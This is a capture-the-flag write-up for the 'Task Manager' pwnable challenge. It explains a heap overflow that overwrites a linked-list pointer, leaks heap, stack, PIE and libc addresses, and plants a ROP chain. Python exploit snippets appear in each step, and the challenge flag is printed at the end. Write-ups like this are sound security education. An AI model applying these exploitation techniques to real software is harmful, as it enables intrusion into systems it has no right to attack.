# Task Manager

## 1. Summary

- **Category**: Pwnable
- **Points**: 57
- **Solves**: 167

### Description

> `I decided to make and host this application so that anyone can keep track of all of the tasks they have to do for the day!`

## 2. Analysis

### Checksec

```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

### Vulnerability

- **Heap-based Buffer Overflow**: The `create_tasks()` function reads 88 bytes into an 80-byte `task` buffer. This allows overwriting the `next` pointer of the `Tasks` structure on the heap.
- **Arbitrary Read via Pointer Overwrite**: By overwriting the `next` pointer and then creating/viewing a task, we can leak any memory address.

## 3. Exploit Flow

1. **Heap & Stack Leak**
   Overwriting the `next` pointer with the address of `taskPointer` (found on the heap) allows us to leak the stack address of the `tasks` variable.

   ```python
   # 1. Overwrite 'next' to leak Heap address and calculate 'taskPointer' address
   payload = b"A" * 0x50
   add_task(r, payload)
   next_ptr = u64(r.recvline().strip().ljust(8, b"\0"))
   head = next_ptr - 0xC0

   # 2. Overwrite 'next' with 'head' to leak Stack address from taskPointer->head
   payload = b"A" * 0x50 + p64(head)
   add_task(r, payload)
   add_task(r, b"A" * 0x8)
   stack_leak = u64(r.recvline().strip().ljust(8, b"\0"))
   ```

2. **PIE & Libc Leak**
   Using the leaked stack address, we target the saved return address and the `main` function pointer on the stack to defeat PIE and ASLR.

   ```python
   # 3. Leak PIE base using stack_main
   payload = b"A" * 0x50 + p64(stack_main - 0x8)
   add_task(r, payload)
   # ... leak logic ...

   # 4. Leak Libc base using stack_ret
   payload = b"A" * 0x50 + p64(stack_ret - 0x8)
   add_task(r, payload)
   # ... leak logic ...
   ```

3. **ROP & Anti-Cleanup**
   We write a ROP chain to the stack at `stack_ret`. To ensure the ROP triggers without crashing during the `Exit` sequence, we overwrite the global `size` variable to `0` to bypass the `free()` calls in `cleanup()`.

   ```python
   # 5. Write ROP chain to stack
   payload = b"A" * 0x50 + p64(stack_ret)
   add_task(r, payload)
   add_task(r, rop.chain())

   # 6. Reset global 'size' to 0 to prevent crash in cleanup() during Exit
   payload = b"A" * 0x50 + p64(elf.sym.size)
   add_task(r, payload)
   add_task(r, p64(0))
   ```

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

## 5. Flag

`gigem{f4s7b1N5_0f_5p141t_hAuN7_8s_d1A593c6CeF}`
